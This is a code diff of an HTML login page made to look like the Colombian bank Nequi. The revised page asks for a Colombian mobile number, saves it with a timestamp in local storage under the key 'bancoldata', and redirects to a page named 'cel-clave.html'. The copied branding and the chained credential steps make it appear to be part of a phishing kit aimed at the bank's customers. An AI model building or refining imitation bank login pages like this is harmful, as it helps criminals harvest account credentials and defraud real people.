@@ -9,156 +9,162 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #210049;
-      color: white;
+      background: #2b002b;
       display: flex;
       justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: white;
     }
 
     .container {
-      max-width: 420px;
       width: 100%;
-      min-height: 100vh;
+      max-width: 400px;
+      padding: 20px;
       display: flex;
       flex-direction: column;
-      padding: 20px;
-    }
-
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+      height: 100vh;
     }
 
     .logo {
+      margin-top: auto;
       text-align: center;
-      margin: 40px 0;
-      font-size: 28px;
+      font-size: 50px;
       font-weight: bold;
+    }
+
+    .logo span {
       color: #ff008c;
     }
 
-    .form-box {
+    .form {
       margin-top: auto;
     }
 
-    .input-container {
-      background: rgba(255,255,255,0.15);
-      border-radius: 6px;
+    /* INPUT CON +57 */
+    .input-box {
+      background: rgba(255,255,255,0.2);
+      border-radius: 8px;
       padding: 10px;
       display: flex;
       align-items: center;
+      gap: 10px;
     }
 
-    input {
-      width: 100%;
+    .prefix {
+      border-right: 2px solid rgba(255,255,255,0.3);
+      padding-right: 10px;
+      font-weight: bold;
+      color: #ffb3e6;
+    }
+
+    .input-box input {
+      flex: 1;
       border: none;
       outline: none;
       background: transparent;
       color: white;
       font-size: 16px;
-      padding: 10px;
     }
 
-    input::placeholder {
+    .input-box input::placeholder {
       color: #ddd;
     }
 
-    .checkbox {
-      margin-top: 10px;
-      font-size: 14px;
-    }
-
-    button {
+    .btn {
+      margin-top: 15px;
       width: 100%;
-      margin-top: 20px;
-      height: 45px;
+      padding: 14px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       background: #ff008c;
       color: white;
       font-size: 16px;
       cursor: pointer;
+      opacity: 0.5;
+      transition: 0.3s;
     }
 
-    button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
+    .btn.active {
+      opacity: 1;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="container">
+<div class="container">
 
-    <div class="header">
-      <div>❓</div>
-      <div style="opacity:0.5;">Nequi</div>
-    </div>
-
-    <div class="logo">NEQUI</div>
-
-    <div class="form-box">
-      <form id="form">
-
-        <div class="input-container">
-          <input type="number" id="userInput" placeholder="Ingresa tu documento">
-        </div>
-
-        <div class="checkbox">
-          <input type="checkbox" id="rememberDoc">
-          Recordar número
-        </div>
-
-        <button id="continueButton" disabled>Continuar</button>
-
-      </form>
-    </div>
-
+  <div class="logo">
+    <span>•</span>Nequi
   </div>
 
-  <script>
-    const userInput = document.getElementById('userInput');
-    const continueButton = document.getElementById('continueButton');
-    const form = document.getElementById('form');
+  <div class="form">
+    <div class="input-box">
+      <div class="prefix">+57</div>
+      <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
+    </div>
 
-    function validar() {
-      const val = userInput.value.trim();
-      continueButton.disabled = val.length < 4;
-    }
+    <button class="btn" id="btn">Entra</button>
+  </div>
 
-    userInput.addEventListener('input', validar);
+</div>
 
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
+<script>
+const input = document.getElementById("phoneInput");
+const btn = document.getElementById("btn");
 
-      const userValue = userInput.value.trim();
+// Formato 3-3-4
+function formatNumber(value) {
+  let digits = value.replace(/\D/g, "");
 
-      if (userValue.length >= 4) {
-        let data = {};
+  if (digits.length > 10) digits = digits.slice(0, 10);
 
-        try {
-          data = JSON.parse(localStorage.getItem('bancoldata')) || {};
-        } catch (e) {
-          data = {};
-        }
+  if (digits.length > 6) {
+    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
+  } else if (digits.length > 3) {
+    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
+  }
+  return digits;
+}
 
-        data.usuario = userValue;
-        data.fecha = new Date().toISOString();
+// input
+input.addEventListener("input", () => {
+  input.value = formatNumber(input.value);
 
-        if (document.getElementById('rememberDoc').checked) {
-          data.rememberDocument = true;
-        }
+  const digits = input.value.replace(/\D/g, "");
 
-        localStorage.setItem('bancoldata', JSON.stringify(data));
+  if (digits.length === 10 && digits.startsWith("3")) {
+    btn.classList.add("active");
+  } else {
+    btn.classList.remove("active");
+  }
+});
 
-        window.location.href = 'cel-clave.html';
-      } else {
-        alert('Ingrese mínimo 4 dígitos');
-      }
-    });
-  </script>
+// click
+btn.addEventListener("click", () => {
+  const raw = input.value.replace(/\D/g, "");
+
+  if (raw.length !== 10 || !raw.startsWith("3")) {
+    alert("Número inválido");
+    return;
+  }
+
+  let data = {};
+  try {
+    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
+  } catch {
+    data = {};
+  }
+
+  data.numero = raw;
+  data.fecha = new Date().toISOString();
+
+  localStorage.setItem("bancoldata", JSON.stringify(data));
+
+  window.location.href = "cel-clave.html";
+});
+</script>
 
 </body>
 </html>
